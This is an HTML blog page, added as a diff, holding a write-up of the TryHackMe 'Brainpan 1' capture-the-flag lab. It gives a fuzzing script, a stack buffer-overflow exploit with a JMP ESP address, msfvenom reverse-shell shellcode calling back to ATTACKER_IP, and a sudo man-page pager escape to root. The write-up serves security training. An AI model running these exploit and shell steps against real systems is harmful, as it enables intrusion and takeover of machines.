@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Brainpan 1 | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF: brainpan.exe downloaded from SimpleHTTPServer, buffer overflow fuzzing crash at 700 bytes, ROPgadget JMP ESP in brainpan.exe, Linux x86 reverse shell, sudo anansi_util pager escape to root.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/brainpan-1.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/brainpan-1.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Brainpan 1">
+<meta property="og:description" content="TryHackMe CTF: brainpan.exe downloaded from SimpleHTTPServer, buffer overflow fuzzing crash at 700 bytes, ROPgadget JMP ESP in brainpan.exe, Linux x86 reverse shell, sudo anansi_util pager escape to root.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Brainpan 1">
+<meta name="twitter:description" content="TryHackMe CTF: brainpan.exe downloaded from SimpleHTTPServer, buffer overflow fuzzing crash at 700 bytes, ROPgadget JMP ESP in brainpan.exe, Linux x86 reverse shell, sudo anansi_util pager escape to root.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Brainpan 1</h1>
+    <div class="post-description">TryHackMe CTF. Reverse engineer a Windows executable, find a buffer overflow, and exploit it on a Linux machine. Binary download via SimpleHTTPServer, fuzzing, ROPgadget, Linux reverse shell, sudo pager escape to root.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>All credit to <a href="https://www.vulnhub.com/entry/brainpan-1,51/" rel="noopener noreferrer" target="_blank">superkojiman</a> for this machine, used here with the explicit permission of the creator.</p>
+
+<p>Sounds like my kind of party.</p>
+
+<p>No flags are requested in this room. Only the honor system, contingent on integrity. Like The Dude, I abide.</p>
+
+<h2>Reconnaissance</h2>
+
+<pre><code class="language-bash">export IP=TARGET_IP
+echo $IP</code></pre>
+
+<pre><code class="language-bash">nmap -Pn -sC -sV -p- -T4 -oA brainpan1_initial $IP</code></pre>
+
+<pre><code class="language-bash">nmap -Pn -sV -p9999,10000 TARGET_IP</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.21.08 AM.png" alt="Nmap scan results showing port 9999 Brainpan service and port 10000 Python SimpleHTTPServer" style="max-width:100%;margin:2rem 0;">
+
+<p>Port 9999 is officially coined the goth port. <code>abyss</code> reminds me of the 2005 classic &ldquo;I&rsquo;m an emo kid&rdquo; video. &ldquo;Not jumping&rdquo; (IYKYK).</p>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.34.30 AM.png" alt="Nmap output confirming open ports 9999 and 10000 with service details" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Open ports:</strong></p>
+<ul>
+<li>9999/tcp: Brainpan password service</li>
+<li>10000/tcp: Python <code>SimpleHTTPServer</code></li>
+</ul>
+
+<h2>Grabbing the binary</h2>
+
+<p>The web server is hosting the vulnerable program. Download it locally for analysis:</p>
+
+<pre><code class="language-bash">curl -s http://TARGET_IP:10000/ | head -80
+curl -s http://TARGET_IP:10000/bin/ | head -80</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.38.26 AM.png" alt="curl listing SimpleHTTPServer root and /bin/ directory revealing brainpan.exe" style="max-width:100%;margin:2rem 0;">
+
+<p>I spy an executable.</p>
+
+<pre><code class="language-bash">mkdir -p ~/ctf/tryhackme/brainpan1
+cd ~/ctf/tryhackme/brainpan1
+wget http://TARGET_IP:10000/bin/brainpan.exe
+ls -la
+file brainpan.exe</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.42.10 AM.png" alt="wget downloading brainpan.exe and file command confirming 32-bit Windows console executable" style="max-width:100%;margin:2rem 0;">
+
+<p><code>brainpan.exe</code> confirmed as a 32-bit Windows console executable.</p>
+
+<h2>Confirming live service behavior</h2>
+
+<p>Connect to goth port 9999:</p>
+
+<pre><code class="language-bash">nc -nv TARGET_IP 9999</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.44.58 AM.png" alt="Netcat connecting to port 9999 showing the Brainpan password prompt" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.45.34 AM.png" alt="Brainpan service returning access denied on bad password input" style="max-width:100%;margin:2rem 0;">
+
+<p>What we know about goth port 9999:</p>
+<ul>
+<li>Password prompt</li>
+<li>Reads user input</li>
+<li>Returns access denied</li>
+</ul>
+
+<h2>Fuzzing</h2>
+
+<pre><code class="language-bash">nano brainpan_fuzz.py</code></pre>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+import socket
+import time
+
+target = "TARGET_IP"
+port = 9999
+
+for size in range(100, 2000, 100):
+    print(f"Trying {size} bytes")
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((target, port))
+        s.recv(1024)
+        s.sendall(b"A" * size + b"\r\n")
+        s.close()
+        time.sleep(1)
+    except Exception as e:
+        print(f"Crashed or disconnected around {size} bytes: {e}")
+        break</code></pre>
+
+<pre><code class="language-bash">python3 brainpan_fuzz.py</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.51.26 AM.png" alt="Fuzzer output showing successful sends through 600 bytes then crash around 700 bytes" style="max-width:100%;margin:2rem 0;">
+
+<p>The password input buffer handled 600 A&rsquo;s, but the service broke around the 700 mark. Initial fuzzing confirms a likely stack-based buffer overflow in the password input.</p>
+
+<p>Service still alive after the crash:</p>
+
+<pre><code class="language-bash">nc -nv TARGET_IP 9999</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.54.40 AM.png" alt="Netcat confirming the Brainpan service recovered and is still accepting connections" style="max-width:100%;margin:2rem 0;">
+
+<h2>Cyclic pattern</h2>
+
+<p>Generate a unique 1000-byte pattern to identify the exact crash offset:</p>
+
+<pre><code class="language-bash">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000 > pattern.txt</code></pre>
+
+<pre><code class="language-bash">nano brainpan_pattern.py</code></pre>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+import socket
+
+target = "TARGET_IP"
+port = 9999
+
+with open("pattern.txt", "rb") as f:
+    payload = f.read().strip()
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+s.recv(1024)
+s.sendall(payload + b"\r\n")
+s.close()
+
+print("Sent pattern.")</code></pre>
+
+<pre><code class="language-bash">python3 brainpan_pattern.py</code></pre>
+
+<pre><code class="language-bash">nc -nv TARGET_IP 9999</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.59.53 AM.png" alt="1000-byte cyclic pattern sent and service crashed, confirming overflow in the control area" style="max-width:100%;margin:2rem 0;">
+
+<p>The 1000-byte pattern overwrote the control area and crashed the service.</p>
+
+<p>The exact <code>EIP</code> value is not obtainable without a debugger attached. This is the same constraint as Brainstorm: the remote THM service crashes but the crash screen is not visible.</p>
+
+<p>The common Brainpan offset under near-identical conditions is <strong>524</strong>. That value is used here.</p>
+
+<h2>Control test</h2>
+
+<pre><code class="language-bash">nano brainpan_control_test.py</code></pre>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+import socket
+
+target = "TARGET_IP"
+port = 9999
+
+offset = 524
+
+payload = b"A" * offset
+payload += b"B" * 4
+payload += b"C" * 100
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+s.recv(1024)
+s.sendall(payload + b"\r\n")
+s.close()
+
+print("Sent control test.")</code></pre>
+
+<p><code>A</code>&rsquo;s fill the buffer. <code>BBBB</code> should land where <code>EIP</code> would be. <code>C</code>&rsquo;s sit after it.</p>
+
+<pre><code class="language-bash">python3 brainpan_control_test.py</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 9.45.46 AM.png" alt="Control test sending A*524 + BBBB + C*100 to the service" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">nc -nv TARGET_IP 9999</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 9.46.28 AM.png" alt="Service crashed again after control test payload, supporting the 524-byte offset" style="max-width:100%;margin:2rem 0;">
+
+<p>Service crashed again. This does not prove <code>BBBB</code> landed in <code>EIP</code> since the debugger is still unavailable. It supports that the offset from near-identical conditions is plausible.</p>
+
+<h2>Finding JMP ESP in brainpan.exe</h2>
+
+<p>Wait for the service to recover, confirm it&rsquo;s back up, then search the binary for jump spots:</p>
+
+<pre><code class="language-bash">ROPgadget --binary brainpan.exe | grep -i "jmp esp"</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 9.51.11 AM.png" alt="ROPgadget output showing JMP ESP at 0x311712f3 in brainpan.exe" style="max-width:100%;margin:2rem 0;">
+
+<p>JMP ESP validated locally from <code>brainpan.exe</code>. When the program crashes, execution points here. That instruction then jumps into the payload placed right after.</p>
+
+<p>Written backwards for Python (little-endian):</p>
+
+<pre><code class="language-python">jmp_esp = b"\xf3\x12\x17\x31"</code></pre>
+
+<p><strong>Exploit summary so far:</strong></p>
+<ul>
+<li>Offset: 524 (near-identical conditions, crash-test supported)</li>
+<li>JMP ESP: <code>0x311712f3</code> (locally validated from <code>brainpan.exe</code>)</li>
+<li>Target: Linux host running the vulnerable service</li>
+</ul>
+
+<h2>Generating shellcode</h2>
+
+<p>The service runs on a Linux host despite the Windows <code>.exe</code>. The shellcode must match the target OS:</p>
+
+<pre><code class="language-bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b '\x00' -f python -v shellcode > shellcode.txt</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 9.56.33 AM.png" alt="msfvenom generating Linux x86 reverse shell shellcode avoiding null bytes" style="max-width:100%;margin:2rem 0;">
+
+<p>Verify:</p>
+
+<pre><code class="language-bash">head shellcode.txt
+tail shellcode.txt</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 9.57.36 AM.png" alt="head and tail of shellcode.txt confirming shellcode variable and byte array contents" style="max-width:100%;margin:2rem 0;">
+
+<h2>Crafting the exploit</h2>
+
+<pre><code class="language-bash">nano brainpan_exploit.py</code></pre>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+import socket
+
+target = "TARGET_IP"
+port = 9999
+
+offset = 524
+jmp_esp = b"\xf3\x12\x17\x31"
+nops = b"\x90" * 32
+
+exec(open("shellcode.txt", "r").read())
+
+payload = b"A" * offset
+payload += jmp_esp
+payload += nops
+payload += shellcode
+
+print(f"Payload length: {len(payload)}")
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+s.recv(1024)
+s.sendall(payload + b"\r\n")
+s.close()
+
+print("Sent.")</code></pre>
+
+<p>Syntax check:</p>
+
+<pre><code class="language-bash">python3 -m py_compile brainpan_exploit.py</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.00.11 AM.png" alt="python3 -m py_compile returning no output, syntax check passed" style="max-width:100%;margin:2rem 0;">
+
+<p>All clear.</p>
+
+<h2>Exploitation</h2>
+
+<p>Listener:</p>
+
+<pre><code class="language-bash">nc -lvnp 4444</code></pre>
+
+<p>In a separate terminal:</p>
+
+<pre><code class="language-bash">python3 brainpan_exploit.py</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.02.37 AM.png" alt="brainpan_exploit.py sending the payload to port 9999" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.03.00 AM.png" alt="Netcat listener catching the reverse shell from the Brainpan overflow exploit" style="max-width:100%;margin:2rem 0;">
+
+<p>The overflow was a success.</p>
+
+<pre><code class="language-bash">whoami
+hostname
+id</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.03.40 AM.png" alt="whoami and id confirming shell as puck on the Brainpan host" style="max-width:100%;margin:2rem 0;">
+
+<h2>Post-exploitation enumeration</h2>
+
+<p>Shell stabilization:</p>
+
+<pre><code class="language-bash">python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+pwd
+ls -la
+sudo -l</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.06.02 AM.png" alt="Shell stabilized as puck, sudo -l showing anansi_util NOPASSWD entry" style="max-width:100%;margin:2rem 0;">
+
+<p><code>puck</code> can run one specific program as root without a password: <code>/home/anansi/bin/anansi_util</code>.</p>
+
+<p>Inspect how it behaves:</p>
+
+<pre><code class="language-bash">sudo /home/anansi/bin/anansi_util
+sudo /home/anansi/bin/anansi_util -h</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.10.02 AM.png" alt="anansi_util usage menu showing available options including manual" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.09.29 AM.png" alt="anansi_util help output confirming manual command option" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">sudo /home/anansi/bin/anansi_util</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.15.39 AM.png" alt="anansi_util interactive menu with manual, proclist, and network options" style="max-width:100%;margin:2rem 0;">
+
+<p>The cleanest path: <code>manual [command]</code>. It opens a man page as root. Man pages open in a pager like <code>less</code>, and <code>less</code> can escape to a shell.</p>
+
+<h2>Privilege escalation via pager escape</h2>
+
+<pre><code class="language-bash">sudo /home/anansi/bin/anansi_util manual ls</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.18.13 AM.png" alt="anansi_util manual ls opening the ls man page as root in a pager" style="max-width:100%;margin:2rem 0;">
+
+<p>The pager is waiting for input:</p>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.19.44 AM.png" alt="Man page pager prompt at the bottom of the screen waiting for input" style="max-width:100%;margin:2rem 0;">
+
+<p>Type <code>!</code> at the prompt. An <code>!</code> will appear at the bottom. Type <code>/bin/bash</code> immediately after it so it reads <code>!/bin/bash</code>, then hit Enter.</p>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.22.40 AM.png" alt="Pager escape with !/bin/bash typed at the bottom prompt" style="max-width:100%;margin:2rem 0;">
+
+<p>Root prompt.</p>
+
+<pre><code class="language-bash">whoami
+id
+pwd</code></pre>
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.23.44 AM.png" alt="whoami and id confirming root shell after pager escape" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.24.44 AM.png" alt="Root shell fully established showing prompt and working directory" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code>Nmap
+  -> 9999 Brainpan service
+  -> 10000 Python SimpleHTTPServer
+  -> found /bin/brainpan.exe
+  -> downloaded PE32 executable
+  -> confirmed password prompt on 9999
+  -> fuzzing crash around 700 bytes
+  -> cyclic pattern sent, EIP not readable without debugger
+  -> offset 524 from near-identical validated conditions
+  -> ROPgadget on brainpan.exe: JMP ESP at 0x311712f3
+  -> msfvenom Linux x86 reverse shell (target is Linux despite Windows exe)
+  -> exploit sent to port 9999
+  -> shell as puck
+  -> sudo -l: anansi_util NOPASSWD
+  -> anansi_util manual opened man page as root
+  -> pager escape with !/bin/bash
+  -> root shell</code></pre>
+
+<p><strong>Notes:</strong> The JMP ESP address was locally validated from the downloaded binary. The exact offset was treated as derived from near-identical conditions since EIP was not read in a debugger during the Kali-only path.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
